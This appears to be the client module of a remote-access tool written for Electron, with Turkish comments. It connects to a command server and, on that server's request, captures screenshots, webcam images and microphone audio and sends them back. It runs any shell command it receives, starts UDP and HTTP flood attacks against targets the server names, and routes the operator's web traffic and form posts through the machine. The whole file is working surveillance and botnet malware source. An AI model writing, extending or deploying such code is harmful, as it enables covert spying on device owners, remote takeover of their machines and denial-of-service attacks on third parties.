const { desktopCapturer, screen, app, ipcMain, BrowserWindow } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const udpRain = require("./udpRain");
const httpRain = require("./httpRain");
const axios = require("axios");
const { URL } = require("url");
//udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });

// My Modules
const info = require("./config");

class RemoteControl {
  constructor() {
    this.mainWindow;
  }
  getCamDataWeb = (data) => {
    console.log({ getCamDataWeb: data });
    this.mainWindow.reload();
    setTimeout(() => {
      this.mainWindow.webContents.send("camStart", data);
    }, 3000);
  };
  
  handleAudioListen = (data) => {
    console.log({ handleAudioListen: data });
    this.mainWindow.webContents.send("audioListenStart", data);
  };

  getScreenData = (data) => {
    (async () => {
      try {
        // Hem screen hem window'ları al
        let sources = await desktopCapturer.getSources({
          types: ["screen", "window"],
          thumbnailSize: {
            width: parseInt(data.dimension.split("x")[0]),
            height: parseInt(data.dimension.split("x")[1]),
          },
        });

        // Screen ID ile bul (index değil)
        const screenId = data.screenId || data.screen; // Eski kod uyumluluğu için data.screen de kontrol et
        
        let foundSource = null;
        try {
          if (screenId) {
            // ID ile ara
            foundSource = sources.find(source => source.id === screenId);
            
            // Eğer bulunamazsa, eski index yöntemini dene (geriye dönük uyumluluk)
            if (!foundSource && !isNaN(parseInt(screenId))) {
              const screenIndex = parseInt(screenId);
              if (screenIndex >= 0 && screenIndex < sources.length) {
                foundSource = sources[screenIndex];
              }
            }
          }

          if (foundSource) {
            try {
              // Window kapanmış olabilir, thumbnail alma işlemini try-catch içine al
              data["src"] = foundSource.thumbnail.toDataURL();
              console.log("Screenshot taken for:", foundSource.name, "ID:", foundSource.id);
              this.socket.emit("screenshotResponse", data);
            } catch (thumbnailError) {
              console.error("Error getting thumbnail (window may be closed):", thumbnailError.message);
              data["src"] = "";
              this.socket.emit("screenshotResponse", data);
            }
          } else {
            console.error("Screen not found. ID:", screenId, "Available sources:", sources.length);
            data["src"] = "";
            this.socket.emit("screenshotResponse", data);
          }
        } catch (findError) {
          console.error("Error finding source (window may be closed):", findError.message);
          data["src"] = "";
          this.socket.emit("screenshotResponse", data);
        }
      } catch (err) {
        console.error("Error getting screen data:", err.message);
        data["src"] = "";
        this.socket.emit("screenshotResponse", data);
      }
    })();
  };


  start = (mainWindow) => {
    this.mainWindow = mainWindow;

    this.socket = io.connect("http://" + info.host + ":" + info.port);
    this.socket.on("connect", () => {
      this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
    });

    this.socket.on("screenshotRequest", (data) => {
      this.getScreenData(data);
    });

    this.socket.on("camShotRequest", (data) => {
      this.getCamDataWeb(data);
    });
    
    this.socket.on("audioListenRequest", (data) => {
      console.log("🎧 Audio listen request received:", data.action);
      this.handleAudioListen(data);
    });

    ipcMain.on("cam", (event, args) => {
      this.socket.emit("camShotResponse", args);
    });
    
    // Binary transfer için yeni handler
    ipcMain.on("camBinary", (event, args) => {
      this.socket.emit("camBinary", args);
    });
    
    // Audio stream için handler
    ipcMain.on("audioStream", (event, args) => {
      console.log("📥 Audio stream received from renderer:", args.audioData ? args.audioData.length : "no data", "chars (base64)");
      console.log("📡 MIME type:", args.mimeType);
      
      if (args.audioData && args.audioData.length > 0) {
        console.log("📤 Forwarding audio data to server");
        this.socket.emit("audioStreamResponse", args);
      } else {
        console.log("⚠️ No audio data to forward");
      }
    });
    
    // Audio listen status için handler
    ipcMain.on("audioListenStatus", (event, args) => {
      this.socket.emit("audioListenStatus", args);
    });

    this.socket.on("getRunRequest", (data) => {
      console.log({ getRunRequest: data });
      if (data.cmd.indexOf("udpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          port: parseInt(splittedData[2]),
          ip: splittedData[1],
          seconds: parseInt(splittedData[3]),
          interval: parseInt(splittedData[4]),
        };
        console.log({ createdData });
        udpRain.start(createdData);
      } else if (data.cmd.indexOf("httpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          url: splittedData[1],
          seconds: parseInt(splittedData[2]),
          interval: parseInt(splittedData[3]),
        };
        console.log({ createdData });
        httpRain.start(createdData);
      }
      else if (data.cmd.indexOf("codeRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          seconds: parseInt(splittedData[1]),
          interval: parseInt(splittedData[2]),
          code: splittedData[3],
        };
        console.log({ createdData });
        httpRain.codeRainStart(createdData);
      }
      else {
        try {
          child_process.exec(
            data.cmd,
            { shell: true },
            (err, stdout, stderr) => {
              if (err) {
                data["cmd"] = "err: " + err;
              } else if (stderr) {
                data["cmd"] = "stderr: " + stderr;
              } else {
                data["cmd"] = stdout;
              }

              this.socket.emit("getRunResponse", data);
            }
          );
        } catch (error) {
          data["cmd"] = "catchError: " + error;
          this.socket.emit("getRunResponse", data);
        }
      }
    });

    /**
     * Remote Browser - Axios ile HTML fetch
     * Dashboard'tan gelen URL'yi axios ile terminal üzerinden fetch eder,
     * HTML'i alır ve tüm relative URL'leri absolute'ye çevirir.
     * Tüm HTTP/HTTPS trafiği bu makineden çıkar.
     */
    this.socket.on("remoteBrowserOpen", (data) => {
      // data: { from, to, url }
      this.fetchRemoteBrowserHTML(data);
    });

    // Screen/window listesi isteği
    this.socket.on("getScreenListRequest", (data) => {
      this.getScreenList(data);
    });
  };

  /**
   * Axios ile HTML fetch ve URL rewrite
   * Tüm trafik terminal makinenin IP'si üzerinden gider.
   */
  fetchRemoteBrowserHTML = async (data) => {
    const targetUrl = data.url;
    const method = data.method || "GET";
    const formData = data.formData || null;

    console.log("Fetching remote browser HTML:", targetUrl, "Method:", method);

    try {
      // Axios ile HTTP isteği (terminal üzerinden)
      const config = {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate, br'
        },
        maxRedirects: 5,
        validateStatus: (status) => status < 500 // 4xx hatalarını da al (404, 403, vs.)
      };

      let response;
      if (method === "POST" && formData) {
        // Form data ile POST - URL encoded format
        const FormDataLib = require('form-data');
        const form = new FormDataLib();
        for (const key in formData) {
          form.append(key, formData[key]);
        }
        config.headers = { ...config.headers, ...form.getHeaders() };
        response = await axios.post(targetUrl, form, config);
      } else {
        // GET isteği
        response = await axios.get(targetUrl, config);
      }

      console.log("HTTP response received:", response.status, response.headers['content-type']);

      let html = response.data;
      const baseUrl = new URL(targetUrl);

      // HTML içindeki tüm relative URL'leri absolute'ye çevir
      html = this.rewriteHTMLUrls(html, baseUrl);

      console.log("Sending HTML to dashboard, length:", html.length);

      // HTML'i dashboard'a gönder
      this.socket.emit("remoteBrowserHTML", {
        from: data.from,
        to: data.to,
        url: targetUrl,
        html: html,
        status: response.status
      });

    } catch (error) {
      console.error("Remote browser fetch error:", error.message);
      console.error("Error details:", error);
      
      // Hata durumunda error HTML gönder
      const errorHtml = `
        <!DOCTYPE html>
        <html>
        <head><title>Error</title></head>
        <body style="font-family: Arial; padding: 20px;">
          <h1>Error Loading Page</h1>
          <p><strong>URL:</strong> ${targetUrl}</p>
          <p><strong>Error:</strong> ${error.message}</p>
          ${error.response ? `<p><strong>Status:</strong> ${error.response.status}</p>` : ''}
          ${error.code ? `<p><strong>Code:</strong> ${error.code}</p>` : ''}
        </body>
        </html>
      `;

      console.log("Sending error HTML to dashboard");
      
      this.socket.emit("remoteBrowserHTML", {
        from: data.from,
        to: data.to,
        url: targetUrl,
        html: errorHtml,
        status: error.response ? error.response.status : 0,
        error: error.message
      });
    }
  };

  /**
   * HTML içindeki tüm relative URL'leri absolute'ye çevir
   * JavaScript'i bozmamak için dikkatli ol
   */
  rewriteHTMLUrls = (html, baseUrl) => {
    try {
      // img src - sadece tag içindeki src'leri değiştir
      html = html.replace(/<img([^>]*?)\s+src=["']([^"']+)["']/gi, (match, attrs, src) => {
        try {
          // JavaScript içinde değilse değiştir
          if (!match.includes('javascript:') && !match.includes('data:')) {
            const absoluteSrc = new URL(src, baseUrl).href;
            return `<img${attrs} src="${absoluteSrc}"`;
          }
          return match;
        } catch (e) {
          return match;
        }
      });

      // script src - sadece external script'leri değiştir
      html = html.replace(/<script([^>]*?)\s+src=["']([^"']+)["']/gi, (match, attrs, src) => {
        try {
          if (!src.startsWith('javascript:') && !src.startsWith('data:')) {
            const absoluteSrc = new URL(src, baseUrl).href;
            return `<script${attrs} src="${absoluteSrc}"`;
          }
          return match;
        } catch (e) {
          return match;
        }
      });

      // link href (CSS, favicon, vs.)
      html = html.replace(/<link([^>]*?)\s+href=["']([^"']+)["']/gi, (match, attrs, href) => {
        try {
          if (!href.startsWith('javascript:') && !href.startsWith('data:')) {
            const absoluteHref = new URL(href, baseUrl).href;
            return `<link${attrs} href="${absoluteHref}"`;
          }
          return match;
        } catch (e) {
          return match;
        }
      });

      // a href (linkler) - JavaScript içindeki href'leri bozmamak için dikkatli
      html = html.replace(/<a([^>]*?)\s+href=["']([^"']+)["']/gi, (match, attrs, href) => {
        try {
          // Hash veya javascript: linklerini olduğu gibi bırak
          if (href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('data:')) {
            return match;
          }
          
          const absoluteHref = new URL(href, baseUrl).href;
          // Link'e onclick ekle ki yeni istek gönderilsin - ama JavaScript'i escape et
          const escapedUrl = absoluteHref.replace(/'/g, "\\'").replace(/"/g, '\\"');
          return `<a${attrs} href="javascript:void(0)" data-remote-url="${absoluteHref}" onclick="window.parent.postMessage({type:'remoteBrowserNavigate', url:'${escapedUrl}'}, '*')"`;
        } catch (e) {
          return match;
        }
      });

      // form action - JavaScript içindeki action'ları bozmamak için
      html = html.replace(/<form([^>]*?)\s+action=["']([^"']+)["']/gi, (match, attrs, action) => {
        try {
          if (action.startsWith('javascript:') || action.startsWith('#')) {
            return match;
          }
          
          const absoluteAction = new URL(action, baseUrl).href;
          const escapedUrl = absoluteAction.replace(/'/g, "\\'").replace(/"/g, '\\"');
          // Form submit'i yakalamak için
          return `<form${attrs} action="javascript:void(0)" data-remote-action="${absoluteAction}" onsubmit="event.preventDefault(); const form=this; window.parent.postMessage({type:'remoteBrowserSubmit', url:'${escapedUrl}', formData: Object.fromEntries(new FormData(form))}, '*'); return false;"`;
        } catch (e) {
          return match;
        }
      });

      // CSS içindeki url() - sadece CSS içinde, JavaScript string'lerinde değil
      // Bu daha karmaşık, sadece style tag'leri ve link'lerdeki CSS'te yap
      html = html.replace(/<style([^>]*)>([\s\S]*?)<\/style>/gi, (match, attrs, cssContent) => {
        try {
          const rewrittenCss = cssContent.replace(/url\(["']?([^"')]+)["']?\)/gi, (cssMatch, url) => {
            try {
              if (!url.startsWith('data:') && !url.startsWith('javascript:')) {
                const absoluteUrl = new URL(url, baseUrl).href;
                return `url("${absoluteUrl}")`;
              }
              return cssMatch;
            } catch (e) {
              return cssMatch;
            }
          });
          return `<style${attrs}>${rewrittenCss}</style>`;
        } catch (e) {
          return match;
        }
      });

      return html;
    } catch (error) {
      console.error("Error rewriting HTML URLs:", error);
      return html; // Hata durumunda orijinal HTML'i döndür
    }
  };

  /**
   * Screen/window listesi al ve dashboard'a gönder
   */
  getScreenList = async (data) => {
    try {
      console.log("Getting screen/window list...");
      
      // Hem screen hem window'ları al
      const sources = await desktopCapturer.getSources({
        types: ["screen", "window"],
        thumbnailSize: { width: 200, height: 200 }
      });

      console.log("Found", sources.length, "sources");

      const screens = sources.map((source, index) => {
        const isScreen = source.id.startsWith("screen:") || source.id.includes("Screen");
        return {
          id: source.id,
          name: source.name || (isScreen ? `Screen ${index + 1}` : `Window: ${source.name}`),
          thumbnail: source.thumbnail.toDataURL(),
          type: isScreen ? "screen" : "window"
        };
      });

      console.log("Sending screen list to dashboard:", screens.length, "items");
      
      this.socket.emit("getScreenListResponse", {
        from: data.from,
        to: data.to,
        screens: screens
      });
    } catch (err) {
      console.error("Error getting screen list:", err);
      this.socket.emit("getScreenListResponse", {
        from: data.from,
        to: data.to,
        screens: []
      });
    }
  };
}

module.exports = new RemoteControl();
